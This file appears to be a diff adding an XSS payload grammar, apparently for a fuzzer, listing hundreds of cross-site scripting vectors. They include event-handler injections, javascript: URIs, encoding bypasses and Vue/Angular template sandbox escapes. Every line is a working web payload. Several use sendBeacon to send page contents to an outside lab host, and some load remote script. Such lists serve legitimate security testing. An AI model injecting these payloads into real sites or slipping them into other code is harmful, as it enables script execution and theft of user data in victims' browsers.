@@ -1,0 +1,410 @@
+<xss_payload> = <lt>xss id=x tabindex=1 onactivate=alert(1)<gt><lt>/xss<gt>
+<xss_payload> = <lt>body onafterprint=alert(1)<gt>
+<xss_payload> = <lt>xss onafterscriptexecute=alert(1)<gt><lt>script<gt>1<lt>/script<gt>
+<xss_payload> = <lt>style<gt>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<lt>/style<gt><lt>xss id=x style="position:absolute;" onanimationcancel="alert(1)"<gt><lt>/xss<gt>
+<xss_payload> = <lt>style<gt>@keyframes x{}<lt>/style<gt><lt>xss style="animation-name:x" onanimationend="alert(1)"<gt><lt>/xss<gt>
+<xss_payload> = <lt>style<gt>@keyframes slidein {}<lt>/style<gt><lt>xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"<gt><lt>/xss<gt>
+<xss_payload> = <lt>style<gt>@keyframes x{}<lt>/style<gt><lt>xss style="animation-name:x" onanimationstart="alert(1)"<gt><lt>/xss<gt>
+<xss_payload> = <lt>xss id=x tabindex=1 onbeforeactivate=alert(1)<gt><lt>/xss<gt>
+<xss_payload> = <lt>xss id=x tabindex=1 onbeforedeactivate=alert(1)<gt><lt>/xss<gt><lt>input autofocus<gt>
+<xss_payload> = <lt>body onbeforeprint=alert(1)<gt>
+<xss_payload> = <lt>xss onbeforescriptexecute=alert(1)<gt><lt>script<gt>1<lt>/script<gt>
+<xss_payload> = <lt>body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)<gt>
+<xss_payload> = <lt>svg<gt><lt>animate onbegin=alert(1) attributeName=x dur=1s<gt>
+<xss_payload> = <lt>a onblur=alert(1) tabindex=1 id=x<gt><lt>/a<gt><lt>input autofocus<gt>
+<xss_payload> = <lt>marquee width=1 loop=1 onbounce=alert(1)<gt>XSS<lt>/marquee<gt>
+<xss_payload> = <lt>audio oncanplay=alert(1)<gt><lt>source src="validaudio.wav" type="audio/wav"<gt><lt>/audio<gt>
+<xss_payload> = <lt>video oncanplaythrough=alert(1)<gt><lt>source src="validvideo.mp4" type="video/mp4"<gt><lt>/video<gt>
+<xss_payload> = <lt>video controls<gt><lt>source src=validvideo.mp4 type=video/mp4<gt><lt>track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE100:00:00.000 --<gt> 00:00:05.000 <lt>b<gt>XSS<lt>/b<gt>"<gt><lt>/video<gt>
+<xss_payload> = <lt>xss id=x tabindex=1 ondeactivate=alert(1)<gt><lt>/xss<gt><lt>input id=y autofocus<gt>
+<xss_payload> = <lt>audio controls ondurationchange=alert(1)<gt><lt>source src=validaudio.mp3 type=audio/mpeg<gt><lt>/audio<gt>
+<xss_payload> = <lt>svg<gt><lt>animate onend=alert(1) attributeName=x dur=1s<gt>
+<xss_payload> = <lt>audio controls autoplay onended=alert(1)<gt><lt>source src="validaudio.wav" type="audio/wav"<gt><lt>/audio<gt>
+<xss_payload> = <lt>audio src/onerror=alert(1)<gt>
+<xss_payload> = <lt>marquee width=1 loop=1 onfinish=alert(1)<gt>XSS<lt>/marquee<gt>
+<xss_payload> = <lt>a id=x tabindex=1 onfocus=alert(1)<gt><lt>/a<gt>
+<xss_payload> = <lt>a id=x tabindex=1 onfocusin=alert(1)<gt><lt>/a<gt>
+<xss_payload> = <lt>a onfocusout=alert(1) tabindex=1 id=x<gt><lt>/a<gt><lt>input autofocus<gt>
+<xss_payload> = <lt>body onhashchange="alert(1)"<gt>
+<xss_payload> = <lt>body onload=alert(1)<gt>
+<xss_payload> = <lt>audio onloadeddata=alert(1)<gt><lt>source src="validaudio.wav" type="audio/wav"<gt><lt>/audio<gt>
+<xss_payload> = <lt>audio autoplay onloadedmetadata=alert(1)<gt> <lt>source src="validaudio.wav" type="audio/wav"<gt><lt>/audio<gt>
+<xss_payload> = <lt>image src=validimage.png onloadend=alert(1)<gt>
+<xss_payload> = <lt>image src=validimage.png onloadstart=alert(1)<gt>
+<xss_payload> = <lt>body onmessage=alert(1)<gt>
+<xss_payload> = <lt>body onpageshow=alert(1)<gt>
+<xss_payload> = <lt>audio autoplay onplay=alert(1)<gt><lt>source src="validaudio.wav" type="audio/wav"<gt><lt>/audio<gt>
+<xss_payload> = <lt>audio autoplay onplaying=alert(1)<gt><lt>source src="validaudio.wav" type="audio/wav"<gt><lt>/audio<gt>
+<xss_payload> = <lt>body onpopstate=alert(1)<gt>
+<xss_payload> = <lt>audio controls onprogress=alert(1)<gt><lt>source src=validaudio.mp3 type=audio/mpeg<gt><lt>/audio<gt>
+<xss_payload> = <lt>applet onreadystatechange=alert(1)<gt><lt>/applet<gt>
+<xss_payload> = <lt>svg<gt><lt>animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 /<gt>
+<xss_payload> = <lt>body onresize="alert(1)"<gt>
+<xss_payload> = <lt>body onscroll=alert(1)<gt><lt>div style=height:1000px<gt><lt>/div<gt><lt>div id=x<gt><lt>/div<gt>
+<xss_payload> = <lt>marquee onstart=alert(1)<gt>XSS<lt>/marquee<gt>
+<xss_payload> = <lt>audio controls autoplay ontimeupdate=alert(1)<gt><lt>source src="validaudio.wav" type="audio/wav"<gt><lt>/audio<gt>
+<xss_payload> = <lt>details ontoggle=alert(1) open<gt>test<lt>/details<gt>
+<xss_payload> = <lt>style<gt>:target {color: red;}<lt>/style<gt><lt>xss id=x style="transition:color 10s" ontransitioncancel=alert(1)<gt><lt>/xss<gt>
+<xss_payload> = <lt>style<gt>:target {color:red;}<lt>/style<gt><lt>xss id=x style="transition:color 1s" ontransitionend=alert(1)<gt><lt>/xss<gt>
+<xss_payload> = <lt>style<gt>:target {transform: rotate(180deg);}<lt>/style<gt><lt>xss id=x style="transition:transform 2s" ontransitionrun=alert(1)<gt><lt>/xss<gt>
+<xss_payload> = <lt>style<gt>:target {color:red;}<lt>/style<gt><lt>xss id=x style="transition:color 1s" ontransitionstart=alert(1)<gt><lt>/xss<gt>
+<xss_payload> = <lt>body onunhandledrejection=alert(1)<gt><lt>script<gt>fetch('//xyz')<lt>/script<gt>
+<xss_payload> = <lt>body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)<gt>
+<xss_payload> = <lt>video autoplay controls onwaiting=alert(1)<gt><lt>source src="validvideo.mp4" type=video/mp4<gt><lt>/video<gt>
+<xss_payload> = <lt>style<gt>@keyframes x{}<lt>/style<gt><lt>xss style="animation-name:x" onwebkitanimationend="alert(1)"<gt><lt>/xss<gt>
+<xss_payload> = <lt>style<gt>@keyframes slidein {}<lt>/style<gt><lt>xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"<gt><lt>/xss<gt>
+<xss_payload> = <lt>style<gt>@keyframes x{}<lt>/style<gt><lt>xss style="animation-name:x" onwebkitanimationstart="alert(1)"<gt><lt>/xss<gt>
+<xss_payload> = <lt>style<gt>:target {color:red;}<lt>/style<gt><lt>xss id=x style="transition:color 1s" onwebkittransitionend=alert(1)<gt><lt>/xss<gt>
+<xss_payload> = <lt>input onauxclick=alert(1)<gt>
+<xss_payload> = <lt>a onbeforecopy="alert(1)" contenteditable<gt>test<lt>/a<gt>
+<xss_payload> = <lt>a onbeforecut="alert(1)" contenteditable<gt>test<lt>/a<gt>
+<xss_payload> = <lt>a onbeforepaste="alert(1)" contenteditable<gt>test<lt>/a<gt>
+<xss_payload> = <lt>input onchange=alert(1) value=xss<gt>
+<xss_payload> = <lt>xss onclick="alert(1)"<gt>test<lt>/xss<gt>
+<xss_payload> = <lt>dialog open onclose=alert(1)<gt><lt>form method=dialog<gt><lt>button<gt>XSS<lt>/button<gt><lt>/form<gt>
+<xss_payload> = <lt>xss oncontextmenu="alert(1)"<gt>test<lt>/xss<gt>
+<xss_payload> = <lt>xss oncopy=alert(1) value="XSS" autofocus tabindex=1<gt>test
+<xss_payload> = <lt>xss oncut=alert(1) value="XSS" autofocus tabindex=1<gt>test
+<xss_payload> = <lt>xss ondblclick="alert(1)" autofocus tabindex=1<gt>test<lt>/xss<gt>
+<xss_payload> = <lt>xss draggable="true" ondrag="alert(1)"<gt>test<lt>/xss<gt>
+<xss_payload> = <lt>xss draggable="true" ondragend="alert(1)"<gt>test<lt>/xss<gt>
+<xss_payload> = <lt>xss draggable="true" ondragenter="alert(1)"<gt>test<lt>/xss<gt>
+<xss_payload> = <lt>xss draggable="true" ondragleave="alert(1)"<gt>test<lt>/xss<gt>
+<xss_payload> = <lt>div draggable="true" contenteditable<gt>drag me<lt>/div<gt><lt>xss ondragover=alert(1) contenteditable<gt>drop here<lt>/xss<gt>
+<xss_payload> = <lt>xss draggable="true" ondragstart="alert(1)"<gt>test<lt>/xss<gt>
+<xss_payload> = <lt>div draggable="true" contenteditable<gt>drag me<lt>/div<gt><lt>xss ondrop=alert(1) contenteditable<gt>drop here<lt>/xss<gt>
+<xss_payload> = <lt>video onfullscreenchange=alert(1) src=validvideo.mp4 controls<gt>
+<xss_payload> = <lt>input oninput=alert(1) value=xss<gt>
+<xss_payload> = <lt>form<gt><lt>input oninvalid=alert(1) required<gt><lt>input type=submit<gt>
+<xss_payload> = <lt>xss onkeydown="alert(1)" contenteditable<gt>test<lt>/xss<gt>
+<xss_payload> = <lt>xss onkeypress="alert(1)" contenteditable<gt>test<lt>/xss<gt>
+<xss_payload> = <lt>xss onkeyup="alert(1)" contenteditable<gt>test<lt>/xss<gt>
+<xss_payload> = <lt>xss onmousedown="alert(1)"<gt>test<lt>/xss<gt>
+<xss_payload> = <lt>xss onmouseenter="alert(1)"<gt>test<lt>/xss<gt>
+<xss_payload> = <lt>xss onmouseleave="alert(1)"<gt>test<lt>/xss<gt>
+<xss_payload> = <lt>xss onmousemove="alert(1)"<gt>test<lt>/xss<gt>
+<xss_payload> = <lt>xss onmouseout="alert(1)"<gt>test<lt>/xss<gt>
+<xss_payload> = <lt>xss onmouseover="alert(1)"<gt>test<lt>/xss<gt>
+<xss_payload> = <lt>xss onmouseup="alert(1)"<gt>test<lt>/xss<gt>
+<xss_payload> = <lt>xss onmousewheel=alert(1)<gt>requires scrolling
+<xss_payload> = <lt>video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls<gt>
+<xss_payload> = <lt>body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)<gt>
+<xss_payload> = <lt>a onpaste="alert(1)" contenteditable<gt>test<lt>/a<gt>
+<xss_payload> = <lt>audio autoplay controls onpause=alert(1)<gt><lt>source src="validaudio.wav" type="audio/wav"<gt><lt>/audio<gt>
+<xss_payload> = <lt>xss onpointerdown=alert(1)<gt>XSS<lt>/xss<gt>
+<xss_payload> = <lt>xss onpointerenter=alert(1)<gt>XSS<lt>/xss<gt>
+<xss_payload> = <lt>xss onpointerleave=alert(1)<gt>XSS<lt>/xss<gt>
+<xss_payload> = <lt>xss onpointermove=alert(1)<gt>XSS<lt>/xss<gt>
+<xss_payload> = <lt>xss onpointerout=alert(1)<gt>XSS<lt>/xss<gt>
+<xss_payload> = <lt>xss onpointerover=alert(1)<gt>XSS<lt>/xss<gt>
+<xss_payload> = <lt>xss onpointerrawupdate=alert(1)<gt>XSS<lt>/xss<gt>
+<xss_payload> = <lt>xss onpointerup=alert(1)<gt>XSS<lt>/xss<gt>
+<xss_payload> = <lt>form onreset=alert(1)<gt><lt>input type=reset<gt>
+<xss_payload> = <lt>form<gt><lt>input type=search onsearch=alert(1) value="Hit return" autofocus<gt>
+<xss_payload> = <lt>audio autoplay controls onseeked=alert(1)<gt><lt>source src="validaudio.wav" type="audio/wav"<gt><lt>/audio<gt>
+<xss_payload> = <lt>audio autoplay controls onseeking=alert(1)<gt><lt>source src="validaudio.wav" type="audio/wav"<gt><lt>/audio<gt>
+<xss_payload> = <lt>input onselect=alert(1) value="XSS" autofocus<gt>
+<xss_payload> = <lt>body onselectionchange=alert(1)<gt>select some text
+<xss_payload> = <lt>body onselectstart=alert(1)<gt>select some text
+<xss_payload> = <lt>div contextmenu=xss<gt><lt>p<gt>Right click<lt>menu type=context id=xss onshow=alert(1)<gt><lt>/menu<gt><lt>/div<gt>
+<xss_payload> = <lt>form onsubmit=alert(1)<gt><lt>input type=submit<gt>
+<xss_payload> = <lt>body ontouchend=alert(1)<gt> 
+<xss_payload> = <lt>body ontouchmove=alert(1)<gt> 
+<xss_payload> = <lt>body ontouchstart=alert(1)<gt> 
+<xss_payload> = <lt>audio autoplay controls onvolumechange=alert(1)<gt><lt>source src="validaudio.wav" type="audio/wav"<gt><lt>/audio<gt>
+<xss_payload> = <lt>body onwheel=alert(1)<gt>
+<xss_payload> = <lt>script<gt>onerror=alert;throw 1<lt>/script<gt>
+<xss_payload> = <lt>script<gt>{onerror=alert}throw 1<lt>/script<gt>
+<xss_payload> = <lt>script<gt>throw onerror=alert,1<lt>/script<gt>
+<xss_payload> = <lt>script<gt>throw onerror=eval,'=alert\x281\x29'<lt>/script<gt>
+<xss_payload> = <lt>script<gt>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}<lt>/script<gt>
+<xss_payload> = <lt>script<gt>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}<lt>/script<gt>
+<xss_payload> = <lt>script<gt>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}<lt>/script<gt>
+<xss_payload> = <lt>script<gt>location='javascript:alert\x281\x29'<lt>/script<gt>
+<xss_payload> = <lt>script<gt>location=name<lt>/script<gt>
+<xss_payload> = <lt>script<gt>alert`1`<lt>/script<gt>
+<xss_payload> = <lt>script<gt>new Function`X${document.location.hash.substr`1`}`<lt>/script<gt>
+<xss_payload> = <lt>script<gt>Function`X${document.location.hash.substr`1`}```<lt>/script<gt>
+<xss_payload> = <lt>xss class=progress-bar-animated onanimationstart=alert(1)<gt>
+<xss_payload> = <lt>xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)<gt><lt>xss class=carousel-inner<gt><lt>xss class="carousel-item active"<gt><lt>/xss<gt><lt>xss class=carousel-item<gt><lt>/xss<gt><lt>/xss<gt><lt>/xss<gt>
+<xss_payload> = <lt>iframe src="javascript:alert(1)"<gt>
+<xss_payload> = <lt>object data="javascript:alert(1)"<gt>
+<xss_payload> = <lt>embed src="javascript:alert(1)"<gt>
+<xss_payload> = <lt>a href="javascript:alert(1)"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>a href="JaVaScript:alert(1)"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>a href=" 	javascript:alert(1)"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>a href="javas	cript:alert(1)"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>a href="javascript:alert(1)"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>svg<gt><lt>a xlink:href="javascript:alert(1)"<gt><lt>text x="20" y="20"<gt>XSS<lt>/text<gt><lt>/a<gt>
+<xss_payload> = <lt>svg<gt><lt>animate xlink:href=#xss attributeName=href values=javascript:alert(1) /<gt><lt>a id=xss<gt><lt>text x=20 y=20<gt>XSS<lt>/text<gt><lt>/a<gt>
+<xss_payload> = <lt>svg<gt><lt>animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /<gt><lt>a id=xss<gt><lt>text x=20 y=20<gt>XSS<lt>/text<gt><lt>/a<gt>
+<xss_payload> = <lt>svg<gt><lt>set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /<gt><lt>a id=xss<gt><lt>text x=20 y=20<gt>XSS<lt>/text<gt><lt>/a<gt>
+<xss_payload> = <lt>script src="data:text/javascript,alert(1)"<gt><lt>/script<gt>
+<xss_payload> = <lt>svg<gt><lt>script href="data:text/javascript,alert(1)" /<gt>
+<xss_payload> = <lt>svg<gt><lt>use href="data:image/svg+xml,<lt>svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'<gt><lt>a xlink:href='javascript:alert(1)'<gt><lt>rect x='0' y='0' width='100' height='100' /<gt><lt>/a<gt><lt>/svg<gt>#x"<gt><lt>/use<gt><lt>/svg<gt>
+<xss_payload> = <lt>script<gt>import('data:text/javascript,alert(1)')<lt>/script<gt>
+<xss_payload> = <lt>base href="javascript:/a/-alert(1)///////"<gt><lt>a href=../lol/safari.html<gt>test<lt>/a<gt>
+<xss_payload> = <lt>math<gt><lt>x href="javascript:alert(1)"<gt>blah
+<xss_payload> = <lt>form<gt><lt>button formaction=javascript:alert(1)<gt>XSS
+<xss_payload> = <lt>form<gt><lt>input type=submit formaction=javascript:alert(1) value=XSS<gt>
+<xss_payload> = <lt>form action=javascript:alert(1)<gt><lt>input type=submit value=XSS<gt>
+<xss_payload> = <lt>svg<gt><lt>use href="//subdomain1.portswigger-labs.net/use_element/upload.php#x" /<gt><lt>/svg<gt>
+<xss_payload> = <lt>svg<gt><lt>animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /<gt><lt>a id=xss<gt><lt>text x=20 y=20<gt>XSS<lt>/text<gt><lt>/a<gt>
+<xss_payload> = <lt>iframe srcdoc="<lt>img src=1 onerror=alert(1)<gt>"<gt><lt>/iframe<gt>
+<xss_payload> = <lt>iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"<gt><lt>/iframe<gt>
+<xss_payload> = <lt>form action="javascript:alert(1)"<gt><lt>input type=submit id=x<gt><lt>/form<gt><lt>label for=x<gt>XSS<lt>/label<gt>
+<xss_payload> = <lt>input type="hidden" accesskey="X" onclick="alert(1)"<gt> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
+<xss_payload> = <lt>link rel="canonical" accesskey="X" onclick="alert(1)" /<gt> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
+<xss_payload> = <lt>a href=# download="filename.html"<gt>Test<lt>/a<gt>
+<xss_payload> = <lt>img referrerpolicy="no-referrer" src="//portswigger-labs.net"<gt>
+<xss_payload> = <lt>a href=# onclick="window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>iframe name="alert(1)" src="https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"<gt><lt>/iframe<gt>
+<xss_payload> = <lt>base target="alert(1)"<gt><lt>a href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"<gt>XSS via target in base tag<lt>/a<gt>
+<xss_payload> = <lt>a target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"<gt>XSS via target in a tag<lt>/a<gt>
+<xss_payload> = <lt>img src="validimage.png" width="10" height="10" usemap="#xss"<gt><lt>map name="xss"<gt><lt>area shape="rect" coords="0,0,82,126" target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"<gt><lt>/map<gt>
+<xss_payload> = <lt>form action="http://subdomain1.portswigger-labs.net/xss/xss.php" target="alert(1)"<gt><lt>input type=hidden name=x value="';eval(name)//"<gt><lt>input type=hidden name=context value=js_string_single<gt><lt>input type="submit" value="XSS via target in a form"<gt><lt>/form<gt>
+<xss_payload> = <lt>form<gt><lt>input type=hidden name=x value="';eval(name)//"<gt><lt>input type=hidden name=context value=js_string_single<gt><lt>input type="submit" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type submit"<gt><lt>/form<gt>
+<xss_payload> = <lt>form<gt><lt>input type=hidden name=x value="';eval(name)//"<gt><lt>input type=hidden name=context value=js_string_single<gt><lt>input name=1 type="image" src="validimage.png" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type image"<gt><lt>/form<gt>
+<xss_payload> = <lt>meta http-equiv="refresh" content="0; url=//portswigger-labs.net"<gt>
+<xss_payload> = <lt>meta charset="UTF-7" /<gt> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<xss_payload> = <lt>meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /<gt> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<xss_payload> = +/v8+ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<xss_payload> = +/v9+ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<xss_payload> = +/v++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<xss_payload> = +/v/+ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<xss_payload> = <lt>meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"<gt>
+<xss_payload> = <lt>iframe sandbox src="//portswigger-labs.net"<gt><lt>/iframe<gt>
+<xss_payload> = <lt>meta name="referrer" content="no-referrer"<gt>
+<xss_payload> = %C0%BCscript<gt>alert(1)<lt>/script<gt>%E0%80%BCscript<gt>alert(1)<lt>/script<gt>%F0%80%80%BCscript<gt>alert(1)<lt>/script<gt>%F8%80%80%80%BCscript<gt>alert(1)<lt>/script<gt>%FC%80%80%80%80%BCscript<gt>alert(1)<lt>/script<gt>
+<xss_payload> = <lt>script<gt>\u0061lert(1)<lt>/script<gt>
+<xss_payload> = <lt>script<gt>\u{61}lert(1)<lt>/script<gt>
+<xss_payload> = <lt>script<gt>\u{0000000061}lert(1)<lt>/script<gt>
+<xss_payload> = <lt>script<gt>eval('\x61lert(1)')<lt>/script<gt>
+<xss_payload> = <lt>script<gt>eval('\141lert(1)')<lt>/script<gt><lt>script<gt>eval('alert(\061)')<lt>/script<gt><lt>script<gt>eval('alert(\61)')<lt>/script<gt>
+<xss_payload> = <lt>a href="&#106;avascript:alert(1)"<gt>XSS<lt>/a<gt><lt>a href="&#106avascript:alert(1)"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>svg<gt><lt>script<gt>&#97;lert(1)<lt>/script<gt><lt>/svg<gt><lt>svg<gt><lt>script<gt>&#x61;lert(1)<lt>/script<gt><lt>/svg<gt><lt>svg<gt><lt>script<gt>alert&NewLine;(1)<lt>/script<gt><lt>/svg<gt><lt>svg<gt><lt>script<gt>x="&quot;,alert(1)//";<lt>/script<gt><lt>/svg<gt>
+<xss_payload> = <lt>a href="&#0000106avascript:alert(1)"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>a href="&#x6a;avascript:alert(1)"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>a href="j&#x61vascript:alert(1)"<gt>XSS<lt>/a<gt><lt>a href="&#x6aavascript:alert(1)"<gt>XSS<lt>/a<gt><lt>a href="&#x6a avascript:alert(1)"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>a href="&#x0000006a;avascript:alert(1)"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>a href="&#X6A;avascript:alert(1)"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>a href="javascript&colon;alert(1)"<gt>XSS<lt>/a<gt><lt>a href="java&Tab;script:alert(1)"<gt>XSS<lt>/a<gt><lt>a href="java&NewLine;script:alert(1)"<gt>XSS<lt>/a<gt><lt>a href="javascript&colon;alert&lpar;1&rpar;"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>a href="javascript:x='%27-alert(1)-%27';"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>a href="javascript:x='&percnt;27-alert(1)-%27';"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>script src=data:text/javascript;base64,YWxlcnQoMSk=<gt><lt>/script<gt>
+<xss_payload> = <lt>script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;<gt><lt>/script<gt>
+<xss_payload> = <lt>script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d<gt><lt>/script<gt>
+<xss_payload> = <lt>iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;<gt><lt>/iframe<gt>
+<xss_payload> = <lt>iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"<gt><lt>/iframe<gt>
+<xss_payload> = <lt>svg<gt><lt>script<gt>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)<lt>/script<gt><lt>/svg<gt>
+<xss_payload> = {{constructor.constructor('alert(1)')()}}
+<xss_payload> = <lt>div v-html="''.constructor.constructor('alert(1)')()"<gt>a<lt>/div<gt>
+<xss_payload> = <lt>x v-html=_c.constructor('alert(1)')()<gt>
+<xss_payload> = <lt>x v-if=_c.constructor('alert(1)')()<gt>
+<xss_payload> = {{_c.constructor('alert(1)')()}}
+<xss_payload> = {{_v.constructor('alert(1)')()}}
+<xss_payload> = {{_s.constructor('alert(1)')()}}
+<xss_payload> = <lt>p v-show="_c.constructor`alert(1)`()"<gt>
+<xss_payload> = <lt>x v-on:click='_b.constructor`alert(1)`()'<gt>click<lt>/x<gt>
+<xss_payload> = <lt>x v-bind:a='_b.constructor`alert(1)`()'<gt>
+<xss_payload> = <lt>x @[_b.constructor`alert(1)`()]<gt>
+<xss_payload> = <lt>x :[_b.constructor`alert(1)`()]<gt>
+<xss_payload> = <lt>p v-=_c.constructor`alert(1)`()<gt>
+<xss_payload> = <lt>x #[_c.constructor`alert(1)`()]<gt>
+<xss_payload> = <lt>p :=_c.constructor`alert(1)`()<gt>
+<xss_payload> = {{_c.constructor('alert(1)')()}}
+<xss_payload> = {{_b.constructor`alert(1)`()}}
+<xss_payload> = <lt>x v-bind:is="'script'" src="//14.rs" /<gt>
+<xss_payload> = <lt>x is=script src=//⑭.₨<gt>
+<xss_payload> = <lt>x @click='_b.constructor`alert(1)`()'<gt>click<lt>/x<gt>
+<xss_payload> = <lt>x @[_b.constructor`alert(1)`()]<gt>
+<xss_payload> = <lt>x :[_b.constructor`alert(1)`()]<gt>
+<xss_payload> = <lt>x #[_c.constructor`alert(1)`()]<gt>
+<xss_payload> = <lt>x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;"<gt>
+<xss_payload> = <lt>x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;"<gt>
+<xss_payload> = <lt>xyz<lt>img/src onerror=alert(1)<gt><gt>
+<xss_payload> = <lt>svg<gt><lt>svg<gt><lt>b<gt><lt>noscript<gt>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;<lt>/noscript<gt><lt>/b<gt><lt>/svg<gt>
+<xss_payload> = <lt>a @['c\lic\u{6b}']="_c.constructor('alert(1)')()"<gt>test<lt>/a<gt>
+<xss_payload> = {{$el.ownerDocument.defaultView.alert(1)}}
+<xss_payload> = {{$el.innerHTML='\u003cimg src onerror=alert(1)\u003e'}}
+<xss_payload> = <lt>img src @error=e=$event.path.pop().alert(1)<gt>
+<xss_payload> = <lt>img src @error=e=$event.composedPath().pop().alert(1)<gt>
+<xss_payload> = <lt>img src @error=this.alert(1)<gt>
+<xss_payload> = <lt>svg@load=this.alert(1)<gt>
+<xss_payload> = {{_openBlock.constructor('alert(1)')()}}
+<xss_payload> = {{_createBlock.constructor('alert(1)')()}}
+<xss_payload> = {{_toDisplayString.constructor('alert(1)')()}}
+<xss_payload> = {{_createVNode.constructor('alert(1)')()}}
+<xss_payload> = <lt>p v-show=_createBlock.constructor`alert(1)`()<gt>
+<xss_payload> = <lt>x @[_openBlock.constructor`alert(1)`()]<gt>
+<xss_payload> = <lt>x @[_capitalize.constructor`alert(1)`()]<gt>
+<xss_payload> = <lt>x @click=_withCtx.constructor`alert(1)`()<gt>click<lt>/x<gt>
+<xss_payload> = <lt>x @click=$event.view.alert(1)<gt>click<lt>/x<gt>
+<xss_payload> = {{_Vue.h.constructor`alert(1)`()}}
+<xss_payload> = {{$emit.constructor`alert(1)`()}}
+<xss_payload> = <lt>teleport to=script:nth-child(2)<gt>alert&lpar;1&rpar;<lt>/teleport<gt><lt>/div<gt><lt>script<gt><lt>/script<gt>
+<xss_payload> = <lt>teleport to=script:nth-child(2)<gt>alert&lpar;1&rpar;<lt>/teleport<gt><lt>/div<gt><lt>script<gt><lt>/script<gt>
+<xss_payload> = <lt>component is=script text=alert(1)<gt>
+<xss_payload> = {{constructor.constructor('alert(1)')()}}
+<xss_payload> = {{$on.constructor('alert(1)')()}}
+<xss_payload> = {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
+<xss_payload> = {{{}.")));alert(1)//"}}
+<xss_payload> = {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+<xss_payload> = {{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
+<xss_payload> = {{{}.")));alert(1)//"}}
+<xss_payload> = {{{}.")));alert(1)//"}}
